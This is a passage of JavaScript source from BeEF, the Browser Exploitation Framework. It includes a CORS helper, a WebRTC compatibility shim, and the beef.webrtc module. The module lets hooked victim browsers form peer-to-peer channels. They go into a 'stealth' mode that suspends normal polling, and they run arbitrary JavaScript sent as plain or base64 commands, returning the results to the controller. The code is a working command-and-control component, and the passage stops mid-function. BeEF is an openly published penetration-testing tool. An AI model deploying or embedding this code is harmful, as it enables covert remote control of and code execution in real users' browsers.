     * @param callback {Function} function to callback on completion
     */
    request: function(method, url, data, callback) {

    var xhr;
    var response = new this.response;

    if (XMLHttpRequest) {
        xhr = new XMLHttpRequest();

        if ('withCredentials' in xhr) {
            xhr.open(method, url, true);
            xhr.onerror = function() {
            };
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4) {
                    response.headers = this.getAllResponseHeaders()
                    response.body    = this.responseText;
                    response.status  = this.status;
                    if (!!callback) {
                        if (!!response) {
                            callback(response);
                        } else { 
                            callback('ERROR: No Response. CORS requests may be denied for this resource.')
                        }
                    }
                }
            };
            xhr.send(data);
        }
    } else if (typeof XDomainRequest != "undefined") {
        xhr = new XDomainRequest();
        xhr.open(method, url);
        xhr.onerror = function() {
        };
        xhr.onload = function() {
            response.headers = this.getAllResponseHeaders()
            response.body    = this.responseText;
            response.status  = this.status;
            if (!!callback) {
                if (!!response) {
                    callback(response);
                } else {
                    callback('ERROR: No Response. CORS requests may be denied for this resource.')
                }
            }
        };
        xhr.send(data);
    } else {
        if (!!callback) callback('ERROR: Not Supported. CORS is not supported by the browser. The request was not sent.');
    }

    }

};

beef.regCmp('beef.net.cors');



//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.are = {
  status_success: function(){
    return 1;
  },
  status_unknown: function(){
    return 0;
  },
  status_error: function(){
    return -1;
  }
};
beef.regCmp("beef.are");


/*
 *  Copyright (c) 2014 The WebRTC project authors. All Rights Reserved.
 *
 *  Use of this source code is governed by a BSD-style license
 *  that can be found in the LICENSE file in the root of the source
 *  tree.
 */

/* More information about these options at jshint.com/docs/options */
/* jshint browser: true, camelcase: true, curly: true, devel: true,
   eqeqeq: true, forin: false, globalstrict: true, node: true,
   quotmark: single, undef: true, unused: strict */
/* global mozRTCIceCandidate, mozRTCPeerConnection, Promise,
mozRTCSessionDescription, webkitRTCPeerConnection, MediaStreamTrack */
/* exported trace,requestUserMedia */

'use strict';

var getUserMedia = null;
var attachMediaStream = null;
var reattachMediaStream = null;
var webrtcDetectedBrowser = null;
var webrtcDetectedVersion = null;
var webrtcMinimumVersion = null;

function trace(text) {
  // This function is used for logging.
  if (text[text.length - 1] === '\n') {
    text = text.substring(0, text.length - 1);
  }
  if (window.performance) {
    var now = (window.performance.now() / 1000).toFixed(3);
    beef.debug(now + ': ' + text);
  } else {
    beef.debug(text);
  }
}

if (navigator.mozGetUserMedia) {

  webrtcDetectedBrowser = 'firefox';

  // the detected firefox version.
  webrtcDetectedVersion =
    parseInt(navigator.userAgent.match(/Firefox\/([0-9]+)\./)[1], 10);

  // the minimum firefox version still supported by adapter.
  webrtcMinimumVersion = 31;

  // The RTCPeerConnection object.
  window.RTCPeerConnection = function(pcConfig, pcConstraints) {
    if (webrtcDetectedVersion < 38) {
      // .urls is not supported in FF < 38.
      // create RTCIceServers with a single url.
      if (pcConfig && pcConfig.iceServers) {
        var newIceServers = [];
        for (var i = 0; i < pcConfig.iceServers.length; i++) {
          var server = pcConfig.iceServers[i];
          if (server.hasOwnProperty('urls')) {
            for (var j = 0; j < server.urls.length; j++) {
              var newServer = {
                url: server.urls[j]
              };
              if (server.urls[j].indexOf('turn') === 0) {
                newServer.username = server.username;
                newServer.credential = server.credential;
              }
              newIceServers.push(newServer);
            }
          } else {
            newIceServers.push(pcConfig.iceServers[i]);
          }
        }
        pcConfig.iceServers = newIceServers;
      }
    }
    return new mozRTCPeerConnection(pcConfig, pcConstraints);
  };

  // The RTCSessionDescription object.
  window.RTCSessionDescription = mozRTCSessionDescription;

  // The RTCIceCandidate object.
  window.RTCIceCandidate = mozRTCIceCandidate;

  // getUserMedia constraints shim.
  getUserMedia = (webrtcDetectedVersion < 38) ?
      function(c, onSuccess, onError) {
    var constraintsToFF37 = function(c) {
      if (typeof c !== 'object' || c.require) {
        return c;
      }
      var require = [];
      Object.keys(c).forEach(function(key) {
        var r = c[key] = (typeof c[key] === 'object') ?
            c[key] : {ideal: c[key]};
        if (r.exact !== undefined) {
          r.min = r.max = r.exact;
          delete r.exact;
        }
        if (r.min !== undefined || r.max !== undefined) {
          require.push(key);
        }
        if (r.ideal !== undefined) {
          c.advanced = c.advanced || [];
          var oc = {};
          oc[key] = {min: r.ideal, max: r.ideal};
          c.advanced.push(oc);
          delete r.ideal;
          if (!Object.keys(r).length) {
            delete c[key];
          }
        }
      });
      if (require.length) {
        c.require = require;
      }
      return c;
    };
    beef.debug('spec: ' + JSON.stringify(c));
    c.audio = constraintsToFF37(c.audio);
    c.video = constraintsToFF37(c.video);
    beef.debug('ff37: ' + JSON.stringify(c));
    return navigator.mozGetUserMedia(c, onSuccess, onError);
  } : navigator.mozGetUserMedia.bind(navigator);

  navigator.getUserMedia = getUserMedia;

  // Shim for mediaDevices on older versions.
  if (!navigator.mediaDevices) {
    navigator.mediaDevices = {getUserMedia: requestUserMedia,
      addEventListener: function() { },
      removeEventListener: function() { }
    };
  }
  navigator.mediaDevices.enumerateDevices =
      navigator.mediaDevices.enumerateDevices || function() {
    return new Promise(function(resolve) {
      var infos = [
        {kind: 'audioinput', deviceId: 'default', label:'', groupId:''},
        {kind: 'videoinput', deviceId: 'default', label:'', groupId:''}
      ];
      resolve(infos);
    });
  };

  if (webrtcDetectedVersion < 41) {
    // Work around http://bugzil.la/1169665
    var orgEnumerateDevices =
        navigator.mediaDevices.enumerateDevices.bind(navigator.mediaDevices);
    navigator.mediaDevices.enumerateDevices = function() {
      return orgEnumerateDevices().catch(function(e) {
        if (e.name === 'NotFoundError') {
          return [];
        }
        throw e;
      });
    };
  }
  // Attach a media stream to an element.
  attachMediaStream = function(element, stream) {
    beef.debug('Attaching media stream');
    element.mozSrcObject = stream;
  };

  reattachMediaStream = function(to, from) {
    beef.debug('Reattaching media stream');
    to.mozSrcObject = from.mozSrcObject;
  };

} else if (navigator.webkitGetUserMedia) {

  webrtcDetectedBrowser = 'chrome';

  // the detected chrome version.
  webrtcDetectedVersion =
    parseInt(navigator.userAgent.match(/Chrom(e|ium)\/([0-9]+)\./)[2], 10);

  // the minimum chrome version still supported by adapter.
  webrtcMinimumVersion = 38;

  // The RTCPeerConnection object.
  window.RTCPeerConnection = function(pcConfig, pcConstraints) {
    var pc = new webkitRTCPeerConnection(pcConfig, pcConstraints);
    var origGetStats = pc.getStats.bind(pc);
    pc.getStats = function(selector, successCallback, errorCallback) { // jshint ignore: line
      // If selector is a function then we are in the old style stats so just
      // pass back the original getStats format to avoid breaking old users.
      if (typeof selector === 'function') {
        return origGetStats(selector, successCallback);
      }

      var fixChromeStats = function(response) {
        var standardReport = {};
        var reports = response.result();
        reports.forEach(function(report) {
          var standardStats = {
            id: report.id,
            timestamp: report.timestamp,
            type: report.type
          };
          report.names().forEach(function(name) {
            standardStats[name] = report.stat(name);
          });
          standardReport[standardStats.id] = standardStats;
        });

        return standardReport;
      };
      var successCallbackWrapper = function(response) {
        successCallback(fixChromeStats(response));
      };
      return origGetStats(successCallbackWrapper, selector);
    };

    return pc;
  };

  // add promise support
  ['createOffer', 'createAnswer'].forEach(function(method) {
    var nativeMethod = webkitRTCPeerConnection.prototype[method];
    webkitRTCPeerConnection.prototype[method] = function() {
      var self = this;
      if (arguments.length < 1 || (arguments.length === 1 &&
          typeof(arguments[0]) === 'object')) {
        var opts = arguments.length === 1 ? arguments[0] : undefined;
        return new Promise(function(resolve, reject) {
          nativeMethod.apply(self, [resolve, reject, opts]);
        });
      } else {
        return nativeMethod.apply(this, arguments);
      }
    };
  });

  ['setLocalDescription', 'setRemoteDescription',
      'addIceCandidate'].forEach(function(method) {
    var nativeMethod = webkitRTCPeerConnection.prototype[method];
    webkitRTCPeerConnection.prototype[method] = function() {
      var args = arguments;
      var self = this;
      return new Promise(function(resolve, reject) {
        nativeMethod.apply(self, [args[0],
            function() {
              resolve();
              if (args.length >= 2) {
                args[1].apply(null, []);
              }
            },
            function(err) {
              reject(err);
              if (args.length >= 3) {
                args[2].apply(null, [err]);
              }
            }]
          );
      });
    };
  });

  // getUserMedia constraints shim.
  getUserMedia = function(c, onSuccess, onError) {
    var constraintsToChrome = function(c) {
      if (typeof c !== 'object' || c.mandatory || c.optional) {
        return c;
      }
      var cc = {};
      Object.keys(c).forEach(function(key) {
        if (key === 'require' || key === 'advanced') {
          return;
        }
        var r = (typeof c[key] === 'object') ? c[key] : {ideal: c[key]};
        if (r.exact !== undefined && typeof r.exact === 'number') {
          r.min = r.max = r.exact;
        }
        var oldname = function(prefix, name) {
          if (prefix) {
            return prefix + name.charAt(0).toUpperCase() + name.slice(1);
          }
          return (name === 'deviceId') ? 'sourceId' : name;
        };
        if (r.ideal !== undefined) {
          cc.optional = cc.optional || [];
          var oc = {};
          if (typeof r.ideal === 'number') {
            oc[oldname('min', key)] = r.ideal;
            cc.optional.push(oc);
            oc = {};
            oc[oldname('max', key)] = r.ideal;
            cc.optional.push(oc);
          } else {
            oc[oldname('', key)] = r.ideal;
            cc.optional.push(oc);
          }
        }
        if (r.exact !== undefined && typeof r.exact !== 'number') {
          cc.mandatory = cc.mandatory || {};
          cc.mandatory[oldname('', key)] = r.exact;
        } else {
          ['min', 'max'].forEach(function(mix) {
            if (r[mix] !== undefined) {
              cc.mandatory = cc.mandatory || {};
              cc.mandatory[oldname(mix, key)] = r[mix];
            }
          });
        }
      });
      if (c.advanced) {
        cc.optional = (cc.optional || []).concat(c.advanced);
      }
      return cc;
    };
    beef.debug('spec:   ' + JSON.stringify(c)); // whitespace for alignment
    c.audio = constraintsToChrome(c.audio);
    c.video = constraintsToChrome(c.video);
    beef.debug('chrome: ' + JSON.stringify(c));
    return navigator.webkitGetUserMedia(c, onSuccess, onError);
  };
  navigator.getUserMedia = getUserMedia;

  // Attach a media stream to an element.
  attachMediaStream = function(element, stream) {
    if (typeof element.srcObject !== 'undefined') {
      element.srcObject = stream;
    } else if (typeof element.src !== 'undefined') {
      element.src = URL.createObjectURL(stream);
    } else {
      beef.debug('Error attaching stream to element.');
    }
  };

  reattachMediaStream = function(to, from) {
    to.src = from.src;
  };

  if (!navigator.mediaDevices) {
    navigator.mediaDevices = {getUserMedia: requestUserMedia,
                              enumerateDevices: function() {
      return new Promise(function(resolve) {
        var kinds = {audio: 'audioinput', video: 'videoinput'};
        return MediaStreamTrack.getSources(function(devices) {
          resolve(devices.map(function(device) {
            return {label: device.label,
                    kind: kinds[device.kind],
                    deviceId: device.id,
                    groupId: ''};
          }));
        });
      });
    }};
    // in case someone wants to listen for the devicechange event.
    navigator.mediaDevices.addEventListener = function() { };
    navigator.mediaDevices.removeEventListener = function() { };
  }
} else if (navigator.mediaDevices && navigator.userAgent.match(
    /Edge\/(\d+).(\d+)$/)) {
  webrtcDetectedBrowser = 'edge';

  webrtcDetectedVersion =
    parseInt(navigator.userAgent.match(/Edge\/(\d+).(\d+)$/)[2], 10);

  // the minimum version still supported by adapter.
  webrtcMinimumVersion = 12;

  attachMediaStream = function(element, stream) {
    element.srcObject = stream;
  };
  reattachMediaStream = function(to, from) {
    to.srcObject = from.srcObject;
  };
} else {
  // console.log('Browser does not appear to be WebRTC-capable');
}

// Returns the result of getUserMedia as a Promise.
function requestUserMedia(constraints) {
  return new Promise(function(resolve, reject) {
    getUserMedia(constraints, resolve, reject);
  });
}

if (typeof module !== 'undefined') {
  module.exports = {
    RTCPeerConnection: window.RTCPeerConnection,
    getUserMedia: getUserMedia,
    attachMediaStream: attachMediaStream,
    reattachMediaStream: reattachMediaStream,
    webrtcDetectedBrowser: webrtcDetectedBrowser,
    webrtcDetectedVersion: webrtcDetectedVersion,
    webrtcMinimumVersion: webrtcMinimumVersion
    //requestUserMedia: not exposed on purpose.
    //trace: not exposed on purpose.
  };
} else if ((typeof require === 'function') && (typeof define === 'function')) {
  // Expose objects and functions when RequireJS is doing the loading.
  define([], function() {
    return {
      RTCPeerConnection: window.RTCPeerConnection,
      getUserMedia: getUserMedia,
      attachMediaStream: attachMediaStream,
      reattachMediaStream: reattachMediaStream,
      webrtcDetectedBrowser: webrtcDetectedBrowser,
      webrtcDetectedVersion: webrtcDetectedVersion,
      webrtcMinimumVersion: webrtcMinimumVersion
      //requestUserMedia: not exposed on purpose.
      //trace: not exposed on purpose.
    };
  });
}


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//


/**
 * @Literal object: beef.webrtc
 *
 * Manage the WebRTC peer to peer communication channels.
 * This objects contains all the necessary client-side WebRTC components,
 * allowing browsers to use WebRTC to communicate with each other.
 * To provide signaling, the WebRTC extension sets up custom listeners.
 *  /rtcsignal - for sending RTC signalling information between peers
 *  /rtcmessage - for client-side rtc messages to be submitted back into beef and logged.
 *
 * To ensure signaling gets back to the peers, the hook.js dynamic construction also includes
 * the signalling.
 *
 * This is all mostly a Proof of Concept
 */

beefrtcs = {}; // To handle multiple peers - we need to have a hash of Beefwebrtc objects
               // The key is the peer id
globalrtc = {}; // To handle multiple Peers - we have to have a global hash of RTCPeerConnection objects
                // these objects persist outside of everything else 
                // The key is the peer id
rtcstealth = false; // stealth should only be initiated from one peer - this global variable will contain:
                    // false - i.e not stealthed; or
                    // <peerid> - i.e. the id of the browser which initiated stealth mode
rtcrecvchan = {}; // To handle multiple event channels - we need to have a global hash of these
                  // The key is the peer id

// Beefwebrtc object - wraps everything together for a peer connection
// One of these per peer connection, and will be stored in the beefrtc global hash
function Beefwebrtc(initiator,peer,turnjson,stunservers,verbparam) {
    this.verbose = typeof verbparam !== 'undefined' ? verbparam : false; // whether this object is verbose or not
    this.initiator = typeof initiator !== 'undefined' ? initiator : 0; // if 1 - this is the caller; if 0 - this is the receiver
    this.peerid = typeof peer !== 'undefined' ? peer : null; // id of this rtc peer
    this.turnjson = turnjson; // set of TURN servers in the format:
                              // {"username": "<username", "password": "<password>", "uris": [
                              //    "turn:<ip>:<port>?transport=<udp/tcp>",
                              //    "turn:<ip>:<port>?transport=<udp/tcp>"]}
    this.started = false; // Has signaling / dialing started for this peer
    this.gotanswer = false; // For the caller - this determines whether they have received an SDP answer from the receiver
    this.turnDone = false; // does the pcConfig have TURN servers added to it?
    this.signalingReady = false; // the initiator (Caller) is always ready to signal. So this sets to true during init
                                 // the receiver will set this to true once it receives an SDP 'offer'
    this.msgQueue = []; // because the handling of SDP signals may happen in any order - we need a queue for them
    this.pcConfig = null; // We set this during init
    this.pcConstraints = {"optional": [{"googImprovedWifiBwe": true}]} // PeerConnection constraints
    this.offerConstraints = {"optional": [], "mandatory": {}}; // Default SDP Offer Constraints - used in the caller
    this.sdpConstraints = {'optional': [{'RtpDataChannels':true}]}; // Default SDP Constraints - used by caller and receiver
    this.gatheredIceCandidateTypes = { Local: {}, Remote: {} }; // ICE Candidates
    this.allgood = false; // Is this object / peer connection with the nominated peer ready to go?
    this.dataChannel = null; // The data channel used by this peer
    this.stunservers = stunservers; // set of STUN servers, in the format:
                                    // ["stun:stun.l.google.com:19302","stun:stun1.l.google.com:19302"]
}

// Initialize the object
Beefwebrtc.prototype.initialize = function() {
  if (this.peerid == null) {
    return 0; // no peerid - NO DICE
  }

  // Initialise the pcConfig hash with the provided stunservers
  var stuns = JSON.parse(this.stunservers);
  this.pcConfig = {"iceServers": [{"urls":stuns, "username":"user",
    "credential":"pass"}]};

  // We're not getting the browsers to request their own TURN servers, we're specifying them through BeEF
  // this.forceTurn(this.turnjson);
  this.turnDone = true;

  // Caller is always ready to create peerConnection.
  this.signalingReady = this.initiator;

  // Start .. maybe 
  this.maybeStart();

  // If the window is closed, send a signal to beef .. this is not all that great, so just commenting out
  // window.onbeforeunload = function() {
  //   this.sendSignalMsg({type: 'bye'});
  // }

  return 1; // because .. yeah .. we had a peerid - this is good yar.
}

//Forces the TURN configuration (we can't query that computeengine thing because it's CORS is restrictive)
//These values are now simply passed in from the config.yaml for the webrtc extension
Beefwebrtc.prototype.forceTurn = function(jason) {
    var turnServer = JSON.parse(jason);
    var iceServers = createIceServers(turnServer.uris,
                                      turnServer.username,
                                      turnServer.password);
    if (iceServers !== null) {
        this.pcConfig.iceServers = this.pcConfig.iceServers.concat(iceServers);
    }
    beef.debug("Got TURN servers, will try and maybestart again..");
    this.turnDone = true;
    this.maybeStart();
}

// Try and establish the RTC connection
Beefwebrtc.prototype.createPeerConnection = function() {
  beef.debug('Creating RTCPeerConnnection with the following options:\n' +
            '  config: \'' + JSON.stringify(this.pcConfig) + '\';\n' +
            '  constraints: \'' + JSON.stringify(this.pcConstraints) + '\'.');
  try {
    // Create an RTCPeerConnection via the polyfill (webrtcadapter.js).
    globalrtc[this.peerid] = new RTCPeerConnection(this.pcConfig, this.pcConstraints);
    globalrtc[this.peerid].onicecandidate = this.onIceCandidate;
    beef.debug('Created RTCPeerConnnection with the following options:\n' +
              '  config: \'' + JSON.stringify(this.pcConfig) + '\';\n' +
              '  constraints: \'' + JSON.stringify(this.pcConstraints) + '\'.');
    
  } catch (e) {
    beef.debug('Failed to create PeerConnection, exception: ');
    beef.debug(e);
    return;
  }

  // Assign event handlers to signalstatechange, iceconnectionstatechange, datachannel etc
  globalrtc[this.peerid].onsignalingstatechange = this.onSignalingStateChanged;
  globalrtc[this.peerid].oniceconnectionstatechange = this.onIceConnectionStateChanged;
  globalrtc[this.peerid].ondatachannel = this.onDataChannel;
  this.dataChannel = globalrtc[this.peerid].createDataChannel("sendDataChannel", {reliable:false});
}

// When the PeerConnection receives a new ICE Candidate
Beefwebrtc.prototype.onIceCandidate = function(event) {
  var peerid = null;

  for (var k in beefrtcs) {
    if (beefrtcs[k].allgood === false) {
      peerid = beefrtcs[k].peerid;
    }
  }

  beef.debug("Handling onicecandidate event while connecting to peer: " + peerid + ". Event received:");
  beef.debug(event);

  if (event.candidate) {
    // Send the candidate to the peer via the BeEF signalling channel
    beefrtcs[peerid].sendSignalMsg({type: 'candidate',
                 label: event.candidate.sdpMLineIndex,
                 id: event.candidate.sdpMid,
                 candidate: event.candidate.candidate});
    // Note this ICE candidate locally
    beefrtcs[peerid].noteIceCandidate("Local", beefrtcs[peerid].iceCandidateType(event.candidate.candidate));
  } else {
    beef.debug('End of candidates.');
  }
}

// For all rtc signalling messages we receive as part of hook.js polling - we have to process them with this function
// This will either add messages to the msgQueue and try and kick off maybeStart - or it'll call processSignalingMessage
// against the message directly
Beefwebrtc.prototype.processMessage = function(message) {
  beef.debug('Signalling Message - S->C: ' + JSON.stringify(message));
  var msg = JSON.parse(message);

  if (!this.initiator && !this.started) { // We are currently the receiver AND we have NOT YET received an SDP Offer
    beef.debug('processing the message, as a receiver');
    if (msg.type === 'offer') { // This IS an SDP Offer
      beef.debug('.. and the message is an offer .. ');
      this.msgQueue.unshift(msg); // put it on the top of the msgqueue
      this.signalingReady = true; // As the receiver, we've now got an SDP Offer, so lets set signalingReady to true
      this.maybeStart(); // Lets try and start again - this will end up with calleeStart() getting executed
    } else { // This is NOT an SDP Offer - as the receiver, just add it to the queue
      beef.debug(' .. the message is NOT an offer .. ');
      this.msgQueue.push(msg);
    }
  } else if (this.initiator && !this.gotanswer) { // We are currently the caller AND we have NOT YET received the SDP Answer
    beef.debug('processing the message, as the sender, no answers yet');
    if (msg.type === 'answer') { // This IS an SDP Answer
        beef.debug('.. and we have an answer ..');
        this.processSignalingMessage(msg); // Process the message directly
        this.gotanswer = true; // We have now received an answer
        //process all other queued message...
        while (this.msgQueue.length > 0) {
            this.processSignalingMessage(this.msgQueue.shift());
        }
    } else { // This is NOT an SDP Answer - as the caller, just add it to the queue
        beef.debug('.. not an answer ..');
        this.msgQueue.push(msg);
    }
  } else { // For all other messages just drop them in the queue
    beef.debug('processing a message, but, not as a receiver, OR, the rtc is already up');
    this.processSignalingMessage(msg);
  } 
}

// Send a signalling message .. 
Beefwebrtc.prototype.sendSignalMsg = function(message) {
  var msgString = JSON.stringify(message);
  beef.debug('Signalling Message - C->S: ' + msgString);
  beef.net.send('/rtcsignal',0,{targetbeefid: this.peerid, signal: msgString});
}

// Used to record ICS candidates locally
Beefwebrtc.prototype.noteIceCandidate = function(location, type) {
  if (this.gatheredIceCandidateTypes[location][type])
    return;
  this.gatheredIceCandidateTypes[location][type] = 1;
  // updateInfoDiv();
}

// When the signalling state changes. We don't actually do anything with this except log it.
Beefwebrtc.prototype.onSignalingStateChanged = function(event) {
  beef.debug("Signalling has changed to: " + event.target.signalingState);
}

// When the ICE Connection State changes - this is useful to determine connection statuses with peers.
Beefwebrtc.prototype.onIceConnectionStateChanged = function(event) {
  var peerid = null;

  for (k in globalrtc) {
    if ((globalrtc[k].localDescription.sdp === event.target.localDescription.sdp) && (globalrtc[k].localDescription.type === event.target.localDescription.type)) {
      peerid = k;
    }
  }

  beef.debug("ICE with peer: " + peerid + " has changed to: " + event.target.iceConnectionState);

  // ICE Connection Status has connected - this is good. Normally means the RTCPeerConnection is ready! Although may still look for 
  // better candidates or connections
  if (event.target.iceConnectionState === 'connected') {
    //Send status to peer
    window.setTimeout(function() {
        beefrtcs[peerid].sendPeerMsg('ICE Status: '+event.target.iceConnectionState);
        beefrtcs[peerid].allgood = true;
        },1000);
  }

  // Completed is similar to connected. Except, each of the ICE components are good, and no more testing remote candidates is done.
  if (event.target.iceConnectionState === 'completed') {
    window.setTimeout(function() {
      beefrtcs[peerid].sendPeerMsg('ICE Status: '+event.target.iceConnectionState);
      beefrtcs[peerid].allgood = true;
    },1000);
  }

  if ((rtcstealth == peerid) && (event.target.iceConnectionState === 'disconnected')) {
    //I was in stealth mode, talking back to this peer - but it's gone offline.. come out of stealth
    rtcstealth = false;
    beefrtcs[peerid].allgood = false;
    beef.net.send('/rtcmessage',0,{peerid: peerid, message: peerid + " - has apparently gotten disconnected"});
  } else if ((rtcstealth == false) && (event.target.iceConnectionState === 'disconnected')) {
    //I was not in stealth, and this peer has gone offline - send a message
    beefrtcs[peerid].allgood = false;
    beef.net.send('/rtcmessage',0,{peerid: peerid, message: peerid + " - has apparently gotten disconnected"});
  }
  // We don't handle situations where a stealthed peer loses a peer that is NOT the peer that made it go into stealth
  // This is possibly a bad idea - @xntrik


}

// This is the function when a peer tells us to go into stealth by sending a dataChannel message of "!gostealth"
Beefwebrtc.prototype.goStealth = function() {
    //stop the beef updater
    rtcstealth = this.peerid; // this is a global variable
    beef.updater.lock = true;
    this.sendPeerMsg('Going into stealth mode');

    setTimeout(function() {rtcpollPeer()}, beef.updater.xhr_poll_timeout * 5);
}

// This is the actual poller when in stealth, it is global as well because we're using the setTimeout to execute it
rtcpollPeer = function() {
    if (rtcstealth == false) {
        //my peer has disabled stealth mode
        beef.updater.lock = false;
        return;
    }

    beef.debug('lub dub');

    beefrtcs[rtcstealth].sendPeerMsg('Stayin alive'); // This is the heartbeat we send back to the peer that made us stealth

    setTimeout(function() {rtcpollPeer()}, beef.updater.xhr_poll_timeout * 5);
}

// When a data channel has been established - within here is the message handling function as well
Beefwebrtc.prototype.onDataChannel = function(event) {
  var peerid = null;
  for (k in globalrtc) {
    if ((globalrtc[k].localDescription.sdp === event.currentTarget.localDescription.sdp) && (globalrtc[k].localDescription.type === event.currentTarget.localDescription.type)) {
      peerid = k;
    }
  }

  beef.debug("Peer: " + peerid + " has just handled the onDataChannel event");
  rtcrecvchan[peerid] = event.channel;

  // This is the onmessage event handling within the datachannel
  rtcrecvchan[peerid].onmessage = function(ev2) {
    beef.debug("Received an RTC message from my peer["+peerid+"]: " + ev2.data);

    // We've received the command to go into stealth mode
    if (ev2.data == "!gostealth") {
        if (beef.updater.lock == true) {
            setTimeout(function() {beefrtcs[peerid].goStealth()},beef.updater.xhr_poll_timeout * 0.4);
        } else {
            beefrtcs[peerid].goStealth();
        }

    // The message to come out of stealth
    } else if (ev2.data == "!endstealth") {

      if (rtcstealth != null) {
        beefrtcs[rtcstealth].sendPeerMsg("Coming out of stealth...");
        rtcstealth = false;
      }

    // Command to perform arbitrary JS (while stealthed)
    } else if ((rtcstealth != false) && (ev2.data.charAt(0) == "%")) {
      beef.debug('message was a command: '+ev2.data.substring(1) + ' .. and I am in stealth mode');
      beefrtcs[rtcstealth].sendPeerMsg("Command result - " + beefrtcs[rtcstealth].execCmd(ev2.data.substring(1)));

    // Command to perform arbitrary JS (while NOT stealthed)
    } else if ((rtcstealth == false) && (ev2.data.charAt(0) == "%")) {
      beef.debug('message was a command - we are not in stealth. Command: '+ ev2.data.substring(1));
      beefrtcs[peerid].sendPeerMsg("Command result - " + beefrtcs[peerid].execCmd(ev2.data.substring(1)));

    // B64d command from the /cmdexec API
    } else if (ev2.data.charAt(0) == "@") {
      beef.debug('message was a b64d command');

      var fn = new Function(atob(ev2.data.substring(1)));
      fn();
      if (rtcstealth != false) { // force stealth back on ?
        beef.updater.execute_commands(); // FORCE execution while stealthed
        beef.updater.lock = true;
      }


    // Just a plain text message .. (while stealthed)
    } else if (rtcstealth != false) {
      beef.debug('received a message, apparently we are in stealth - so just send it back to peer['+rtcstealth+']');
      beefrtcs[rtcstealth].sendPeerMsg(ev2.data);

    // Just a plan text message (while NOT stealthed)
    } else {
      beef.debug('received a message from peer['+peerid+'] - sending it back to beef');
      beef.net.send('/rtcmessage',0,{peerid: peerid, message: ev2.data});
    }
  } 
}

// How the browser executes received JS (this is pretty hacky)
Beefwebrtc.prototype.execCmd = function(input) {
  var fn = new Function(input);
  var res = fn();
  return res.toString();
}

// Shortcut function to SEND a data messsage
Beefwebrtc.prototype.sendPeerMsg = function(msg) {
  beef.debug('sendPeerMsg to ' + this.peerid);
  this.dataChannel.send(msg);
}

// Try and initiate, will check that system hasn't started, and that signaling is ready, and that TURN servers are ready
Beefwebrtc.prototype.maybeStart = function() {
  beef.debug("maybe starting ... ");

  if (!this.started && this.signalingReady && this.turnDone) {
    beef.debug('Creating PeerConnection.');
    this.createPeerConnection();

    this.started = true;

    if (this.initiator) {
      beef.debug("Making the call now .. bzz bzz");
      this.doCall();
    } else {
      beef.debug("Receiving a call now .. somebuddy answer da fone?");
      this.calleeStart();
    }

  } else {
    beef.debug("Not ready to start just yet..");
  }
}

// RTC - create an offer - the caller runs this, while the receiver runs calleeStart()
Beefwebrtc.prototype.doCall = function() {
  var constraints = this.mergeConstraints(this.offerConstraints, this.sdpConstraints);
  var self = this;
  globalrtc[this.peerid].createOffer(this.setLocalAndSendMessage, this.onCreateSessionDescriptionError, constraints);
  beef.debug('Sending offer to peer, with constraints: \n' +
             '  \'' + JSON.stringify(constraints) + '\'.');
}

// Helper method to merge SDP constraints
Beefwebrtc.prototype.mergeConstraints = function(cons1, cons2) {
  var merged = cons1;
  for (var name in cons2.mandatory) {
    merged.mandatory[name] = cons2.mandatory[name];
  }
  merged.optional.concat(cons2.optional);
  return merged;
}

// Sets the local RTC session description, sends this information back (via signalling)
// The caller uses this to set it's local description, and it then has to send this to the peer (via signalling)
// The receiver uses this information too - and vice-versa - hence the signaling
Beefwebrtc.prototype.setLocalAndSendMessage = function(sessionDescription) {
  // This fucking function does NOT receive a 'this' state, and you can't pass additional parameters
  // Stupid .. javascript :(
  // So I'm hacking it to find the peerid gah - I believe *this* is what means you can't establish peers concurrently
  // i.e. this browser will have to wait for this peerconnection to establish before attempting to connect to the next one..
  var peerid = null;

  for (var k in beefrtcs) {
    if (beefrtcs[k].allgood === false) {
      peerid = beefrtcs[k].peerid;
    }
  }
  beef.debug("For peer: " + peerid + " Running setLocalAndSendMessage...");

  globalrtc[peerid].setLocalDescription(sessionDescription, onSetSessionDescriptionSuccess, onSetSessionDescriptionError);
  beefrtcs[peerid].sendSignalMsg(sessionDescription);

  function onSetSessionDescriptionSuccess() {
    beef.debug('Set session description success.');
  }

  function onSetSessionDescriptionError() {
    beef.debug('Failed to set session description');
  }
}

// If the browser can't build an SDP
Beefwebrtc.prototype.onCreateSessionDescriptionError = function(error) {
  beef.debug('Failed to create session description: ' + error.toString());
}

// If the browser successfully sets a remote description
Beefwebrtc.prototype.onSetRemoteDescriptionSuccess = function() {
  beef.debug('Set remote session description successfully');
}

// Check for messages - which includes signaling from a calling peer - this gets kicked off in maybeStart()
Beefwebrtc.prototype.calleeStart = function() {
  // Callee starts to process cached offer and other messages.
  while (this.msgQueue.length > 0) {
    this.processSignalingMessage(this.msgQueue.shift());
  }
}

// Process messages, this is how we handle the signaling messages, such as candidate info, offers, answers
Beefwebrtc.prototype.processSignalingMessage = function(message) {
  if (!this.started) {
    beef.debug('peerConnection has not been created yet!');
    return;
  }

  if (message.type === 'offer') {
    beef.debug("Processing signalling message: OFFER");
    if (navigator.mozGetUserMedia) { // Mozilla shim fuckn shit - since the new
                                     // version of FF - which no longer works
        beef.debug("Moz shim here");
        globalrtc[this.peerid].setRemoteDescription(
            new RTCSessionDescription(message),
            function() {
              // globalrtc[this.peerid].createAnswer(function(answer) {
              //   globalrtc[this.peerid].setLocalDescription(

              var peerid = null;

              for (var k in beefrtcs) {
                if (beefrtcs[k].allgood === false) {
                  peerid = beefrtcs[k].peerid;
                }
              }

              globalrtc[peerid].createAnswer(function(answer) {
                globalrtc[peerid].setLocalDescription(
                    new RTCSessionDescription(answer),
                    function() {
                      beefrtcs[peerid].sendSignalMsg(answer);
                    },function(error) {
                      beef.debug("setLocalDescription error: " + error);
                    });
              },function(error) {
                beef.debug("createAnswer error: " +error);
              });
            },function(error) {
              beef.debug("setRemoteDescription error: " + error);
            });
                          
    } else {
      this.setRemote(message);
      this.doAnswer();
    }
  } else if (message.type === 'answer') {
    beef.debug("Processing signalling message: ANSWER");
    if (navigator.mozGetUserMedia) { // terrible moz shim - as for the offer
        beef.debug("Moz shim here");
        globalrtc[this.peerid].setRemoteDescription(
          new RTCSessionDescription(message),
          function() {},
          function(error) {
